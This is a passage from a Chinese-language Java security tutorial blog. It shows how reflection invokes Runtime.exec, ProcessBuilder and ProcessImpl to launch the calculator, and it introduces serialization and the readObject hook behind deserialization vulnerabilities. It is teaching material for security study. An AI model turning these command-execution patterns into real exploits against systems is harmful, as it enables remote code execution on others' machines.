java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        Class&lt;?&gt; clzz =  Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        clzz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(clzz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clzz),<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725104708698.png" alt="image-20220725104708698"></p><h5 id="ProcessBuilder——有参构造方法"><a href="#ProcessBuilder——有参构造方法" class="headerlink" title="ProcessBuilder——有参构造方法"></a>ProcessBuilder——有参构造方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br>        Class&lt;?&gt; clzz =  Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>        clzz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clzz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;&#125;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725105440284.png" alt="image-20220725105440284"></p><h5 id="ProcessImpl——私有方法"><a href="#ProcessImpl——私有方法" class="headerlink" title="ProcessImpl——私有方法"></a>ProcessImpl——私有方法</h5><blockquote><p>注意：此类的访问会被JDK9及其以上的版本默认拦截。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        Class&lt;?&gt; clzz =  Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span>  clzz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);<br>        start.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置私有方法为可访问</span><br>        start.invoke(clzz,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725112559964.png" alt="image-20220725112559964"></p><h4 id="Feild例子"><a href="#Feild例子" class="headerlink" title="Feild例子"></a>Feild例子</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-type">person</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">person</span>();<br>        me.show();<br><br>        Class&lt;?&gt; clzz =  Class.forName(<span class="hljs-string">&quot;person&quot;</span>);<br><br>        System.out.println(clzz.getField(<span class="hljs-string">&quot;name&quot;</span>).get(me));<span class="hljs-comment">//获取name属性</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> clzz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        age.setAccessible(<span class="hljs-literal">true</span>);<br>        System.out.println(age.get(me));<span class="hljs-comment">//获取age属性</span><br><br>        age.set(me,<span class="hljs-number">21</span>);<span class="hljs-comment">//修改age属性</span><br><br>        me.show();<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>   <span class="hljs-keyword">public</span> String name;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Rookie&quot;</span>;<br>       <span class="hljs-built_in">this</span>.age = <span class="hljs-number">20</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;name is:&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;\nage is:&quot;</span>+<span class="hljs-built_in">this</span>.age);<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725113740144.png" alt="image-20220725113740144"></p><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>在OOP之中，序列化和反序列化都是老生常谈的东西。</p><p>对于 Java来说 JVM结束运行的时候就会清理掉所有的对象，对于一些场景下需要将对象保留下来，供给下次或者其他地方使用。序列化就解决了这个问题。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725143123460.png" alt="image-20220725143123460"></p><p>在 Java中并不是所有的对象都可以进行序列化操作的。要能都序列化需要满足两个条件</p><ul><li><p>实现 java.io.Serializable 接口</p><p>这是一个特殊的 空接口，内部没有定义任何方法。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725144422059.png" alt="image-20220725144422059"></p></li><li><p>所有属性都是可序列化的</p></li></ul><p><strong>例子</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">person</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">person</span>();<br>        me.show();<br>        me.setAge(<span class="hljs-number">22</span>);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./me.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(me);<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./me.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        person me2= (person) in.readObject();<br><br>        me2.show();<br><br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>   <span class="hljs-keyword">public</span> String name;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Rookie&quot;</span>;<br>       <span class="hljs-built_in">this</span>.age = <span class="hljs-number">20</span>;<br>   &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;name is:&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;\nage is:&quot;</span>+<span class="hljs-built_in">this</span>.age);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725164010808.png" alt="image-20220725164010808"></p><p>例子中将序列化的数据保存到me.ser文件中，在将其读取出来进行反序列化，可以看到保留了修改的地方，证明把对象留存下来了。</p><p>PHP的反序列化漏洞的关键点在于反序列化的过程中会触发一些魔术方法</p><p>而Java的反序列化的过程中也会自动一个名为 <code>readObject()</code>的方法。</p><p>向上面的person类中添加一个readObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;[*]执行了readObject方法&quot;</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220725164831133.png" alt="image-20220725164831133"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
